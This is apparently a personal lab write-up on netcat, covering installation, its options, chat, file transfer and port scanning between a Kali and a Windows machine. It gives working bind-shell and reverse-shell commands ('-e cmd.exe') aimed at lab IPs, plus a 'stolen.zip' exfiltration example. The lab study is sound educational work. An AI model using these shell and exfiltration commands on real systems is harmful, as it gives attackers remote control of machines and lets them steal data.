# Netcat(nc)

![Netcat-738x400-1-3](https://github.com/user-attachments/assets/d8ab8114-418c-4b59-9b66-dd37cdf9d82d)

## What is netcat?
Netcat is one of the most powerful networking tools, security tools, and network monitoring tools. It is even considered a Swiss army knife of networking tools. It acts like a cat command over a network. It is generally used for the following reasons:
   - Operation related to TCP, UDP, or UNIX-domain sockets.
   - Port Scanning
   - Port Listening
   - Port redirection
   - open Remote connections
   - Read/Write data across the network.
   - Network debugging
   - Network daemon testing
   - Simple TCP proxies
   - A Socks or HTTP Proxy Command for ssh


## LAB TOOLS
- Kali Linux
- Windows


### 1. Installation
````
sudo apt install netcat-openbsd
````
<img width="802" height="427" alt="image" src="https://github.com/user-attachments/assets/9dc00e43-3d1e-45b8-8483-95fb3435a294" />

- Verify
````
nc -h
````
<img width="678" height="734" alt="image" src="https://github.com/user-attachments/assets/fa8cd60b-71b2-46c8-82b9-38757671b026" />


## Usage:
| **Option**         | **Description**                                    |
| ------------------ | -------------------------------------------------- |
| `-4`               | Use IPv4                                           |
| `-6`               | Use IPv6                                           |
| `-b`               | Allow broadcasts                                   |
| `-C`               | Send CRLF as line-ending                           |
| `-D`               | Enable the debug socket option                     |
| `-d`               | Detach from stdin                                  |
| `-F`               | Pass socket file descriptor                        |
| `-h`               | Show help text                                     |
| `-I (length)`      | TCP receive buffer length                          |
| `-i (interval)`    | Delay interval between lines sent or ports scanned |
| `-k`               | Keep inbound sockets open for multiple connects    |
| `-l`               | Listen mode, for inbound connects                  |
| `-M (ttl)`         | Outgoing TTL / Hop Limit                           |
| `-m (minttl)`      | Minimum incoming TTL / Hop Limit                   |
| `-N`               | Shutdown the network socket after EOF on stdin     |
| `-n`               | Suppress name/port resolutions                     |
| `-O (length)`      | TCP send buffer length                             |
| `-o (proxyuser)`   | Username for proxy authentication                  |
| `-p (port)`        | Specify local port for remote connects             |
| `-q (secs)`        | Quit after EOF on stdin and delay of secs          |
| `-r`               | Randomize remote ports                             |
| `-s (sourceaddr)`  | Local source address                               |
| `-T (keyword)`     | Set TOS value                                      |
| `-t`               | Answer TELNET negotiation                          |
| `-U`               | Use UNIX domain socket                             |
| `-u`               | UDP mode                                           |
| `-V (rtable)`      | Specify alternate routing table                    |
| `-v`               | Verbose (use twice for more effect)                |
| `-w (timeout)`     | Timeout for connects and final net reads           |
| `-X (proto)`       | Proxy protocol: `"4"` (SOCKS) or `"connect"`       |
| `-x (addr[:port])` | Specify proxy address and port                     |
| `-z`               | Zero-I/O mode (used for scanning)                  |



### In windows we need to downloads nmap/netcat.

https://nmap.org/dist/ncat-portable-7.94-setup.exe?spm=a2ty_o01.29997173.0.0.11d2c921zqJpmc&file=ncat-portable-7.94-setup.exe

<img width="960" height="915" alt="image" src="https://github.com/user-attachments/assets/6e2c3e99-c91b-4576-9d1d-6bdc7a5711ef" />

- Go to file we will see `nmap` like this:
<img width="769" height="564" alt="image" src="https://github.com/user-attachments/assets/ff0dbf9b-c60d-4000-9b77-4b29bfebe714" />

double click on it we see:

<img width="463" height="318" alt="image" src="https://github.com/user-attachments/assets/8a458b15-14e8-44ad-b3cb-c15e32eb8a47" />

- Click `yes`

<img width="477" height="373" alt="image" src="https://github.com/user-attachments/assets/b867b944-3268-4e65-9805-10be2ae9e6e4" />

- Click `I Agree`

<img width="496" height="375" alt="image" src="https://github.com/user-attachments/assets/4bc37d25-895d-41c4-9142-7011b1c26cbf" />

- Click `next`

<img width="491" height="386" alt="image" src="https://github.com/user-attachments/assets/98a7e19c-d6f5-499b-b9c0-12089f78ac86" />

- Click `Install`

<img width="495" height="384" alt="image" src="https://github.com/user-attachments/assets/6c36b9a2-7a1d-4637-8c48-735fad011930" />

- It will install.

<img width="494" height="377" alt="image" src="https://github.com/user-attachments/assets/e09abadf-b976-4323-b42b-5a55fac92836" />

- click `I Agree`

<img width="496" height="387" alt="image" src="https://github.com/user-attachments/assets/fa575ff0-43c5-4924-a6b1-d4b08ed04c3d" />

- Clcik `Install`

<img width="486" height="384" alt="image" src="https://github.com/user-attachments/assets/d917f5c7-9a9c-472b-ad5f-696ae428490a" />

- It will install again.

<img width="493" height="387" alt="image" src="https://github.com/user-attachments/assets/cf6ffa00-cb97-45c2-8101-7ccee5b25f17" />

- `next`

<img width="498" height="386" alt="image" src="https://github.com/user-attachments/assets/c4fc7209-b08f-487c-b4ef-69723e0a59e1" />

- `finish`

<img width="494" height="385" alt="image" src="https://github.com/user-attachments/assets/be6d1de4-4046-4838-9807-4af2846d91b3" />

- It will finish downloads and click `next`

<img width="492" height="384" alt="image" src="https://github.com/user-attachments/assets/fce31ca6-3083-479d-a7c7-67c5fc28537c" />

- `next` and `finish`

<img width="790" height="866" alt="image" src="https://github.com/user-attachments/assets/9a1bcc41-38ec-45f7-a37b-6e16e45706f5" />

- We will see Nmap-Zenmap GUI


## Basic command
Type this command in windows:
````
ncat -lvp 4444
````
<img width="453" height="240" alt="image" src="https://github.com/user-attachments/assets/7b5876c4-1462-4849-96e5-fdcdd13e7684" />

and in kali:
````
nc 192.168.127.130 4444
````
<img width="308" height="140" alt="image" src="https://github.com/user-attachments/assets/1518f8ac-b026-4e4b-a391-b1152b32511f" />

#### Note: My IP 
- Kali: 192.168.127.128
- windows 10 : 192.168.127.130

<img width="329" height="103" alt="image" src="https://github.com/user-attachments/assets/1843a97e-77c6-47cc-ba9e-d1b57c9d8214" />

<img width="328" height="139" alt="image" src="https://github.com/user-attachments/assets/0d60bfde-ca5d-404f-99ac-1bfdc2f90a49" />

- we see in windows.


## 2. Chat Between kali $ windows
- In windows
````
ncat -l -p 4444
````
<img width="427" height="70" alt="image" src="https://github.com/user-attachments/assets/c1a4d946-d00e-48f2-acfb-26c83b9ab3ce" />

- In kali
````
nc 192.168.127.130 4444
````
<img width="488" height="77" alt="image" src="https://github.com/user-attachments/assets/d531ada6-9a73-4fe1-9568-3de4d2242e88" />


## 3. File Transfer
- Windows (receive a file):
````
ncat -l -p 1234 > recieved.txt
````
<img width="457" height="248" alt="image" src="https://github.com/user-attachments/assets/dd3909c4-8f03-4eb1-9080-e61f61fd83ba" />

- The file appears on Windows as receive.txt.

````
nc -v 192.168.127.130 1234 < sender.txt
````
<img width="506" height="133" alt="image" src="https://github.com/user-attachments/assets/e1b08306-0bc0-4d3a-84b3-d37b27217b81" />



## 4. Bind Shell (Windows waits, Kali connects)
- Windows (start shell on port 4444):
````
ncat -l -p 4444 -e cmd.exe
````
<img width="388" height="111" alt="image" src="https://github.com/user-attachments/assets/3e578092-c052-4263-9ad5-27ff97443354" />


- In kali
````
nc 192.168.127.130 4444
````
<img width="422" height="151" alt="image" src="https://github.com/user-attachments/assets/716d48c8-933a-4afe-9cf6-670046e80a66" />

- We get a Windows CMD shell from Kali.

````
dir
````
<img width="522" height="670" alt="image" src="https://github.com/user-attachments/assets/709952b9-1ce4-406d-a778-fe63a21e44a4" />

In this we will see file in windows.



## 5. Reverse Shell (Windows connects back to Kali)
- Kali(listener)
````
nc -lvnp 4444
````
<img width="309" height="96" alt="image" src="https://github.com/user-attachments/assets/92484829-2476-4b9a-94f5-62aa6812615a" />


- Windows (send reverse shell to Kali):
````
ncat 192.168.127.128 4444 -e cmd.exe
````
<img width="581" height="203" alt="image" src="https://github.com/user-attachments/assets/65a08913-98fd-4005-b42e-9fa949638a00" />

- In kali we will see:
<img width="400" height="167" alt="image" src="https://github.com/user-attachments/assets/486b4562-cca0-4af0-85d0-bcaa682fa03c" />

- Now i control Windows shell on Kali.
- It the same like `Bind Shell (Windows waits, Kali connects)`


6. Port scanning
- From Windows scanning Kali:
````
ncat -zv 192.168.127.129 1-443
nmap -p 21,22,80,443 192.168.127.128
````
<img width="476" height="273" alt="image" src="https://github.com/user-attachments/assets/68715f63-2358-401e-baaf-284a8218eaae" />

- In netcat we will error but we can scan with nmap in windows.


### Summery command above:

| Task          | Windows Command                 | Kali Command           |
| ------------- | ------------------------------- | ---------------------- |
| Chat          | `nc.exe -l -p 4444`             | `nc winIP 4444`        |
| File transfer | `nc.exe -l -p 1234 > file`      | `nc winIP 1234 < file` |
| Bind shell    | `nc.exe -l -p 4444 -e cmd.exe`  | `nc winIP 4444`        |
| Reverse shell | `nc.exe kaliIP 4444 -e cmd.exe` | `nc -lvnp 4444`        |
| Port scan     | `nc.exe -zv kaliIP 20-100`      | `nc -zv winIP 1-1024`  |



### ============>> End Of Netcat



### Why hacke use netcat:
Hackers use netcat (nc) due to its versatility, simplicity, and powerful networking capabilities, which can be leveraged for both legitimate and malicious purposes.
- Port Scanning (Reconnaissance)
- File Transfer (Stealthy Data Exfiltration) Like:
   - Victim machine (receive):
  ````
  nc -l -p 4444 > stolen.zip
  ````
   - Attacker machine (send):
  ````
   nc victimIP 4444 < stolen.zip
  ````
- Backdoor Access (Shells)


### Creditable:
1. https://www.youtube.com/watch?v=KlzSBk7VMss&t=35s
2. https://www.youtube.com/watch?v=9g17KWZHWc0


### Practice in LAB BY: Nin Kanong(k4n0ng)
#### Date: 31/Aug/2025
